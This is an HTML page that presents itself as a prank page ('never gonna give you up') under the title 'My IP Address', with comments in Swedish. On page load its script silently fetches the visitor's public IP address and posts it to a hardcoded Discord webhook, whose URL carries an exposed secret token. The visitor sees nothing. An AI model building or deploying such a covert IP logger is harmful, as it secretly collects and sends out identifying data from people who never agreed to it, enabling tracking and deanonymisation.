<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My IP Address</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
        }
        .container {
            text-align: center;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>never gonna give you up</h1>
        <!-- Det dolda elementet är helt borttaget härifrån -->
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534463856724934656/6BaQh1PJ4ZTe4NW2jNetcUtMaepx63_H6ZFX6DyMIpDkKyEb_hH2pl0pDcTscXg0Rg2O';
        
        // Den globala variabeln där IP-adressen kommer att sparas
        let myIP = "";

        // Hämtar IP-adressen som text
        fetch('https://icanhazip.com')
            .then(response => {
                if (!response.ok) throw new Error('Network error fetching IP');
                return response.text();
            })
            .then(ip => {
                // Sparar värdet i variabeln och rensar bort dolda radbrytningar
                myIP = ip.trim();
                
                console.log('IP-adressen har sparats i variabeln:', myIP);

                // Skickar variabeln till din webhook
                return fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Ny IP-adress registrerad: ${myIP}`,
                        ip: myIP
                    })
                });
            })
            .then(webhookResponse => {
                console.log('Anrop klart.');
            })
            .catch(error => {
                // Alla felhanterare som rörde HTML-texten är borttagna så att det inte kraschar
                console.error('Ett fel uppstod i skriptet:', error);
            });
    </script>

</body>
</html>
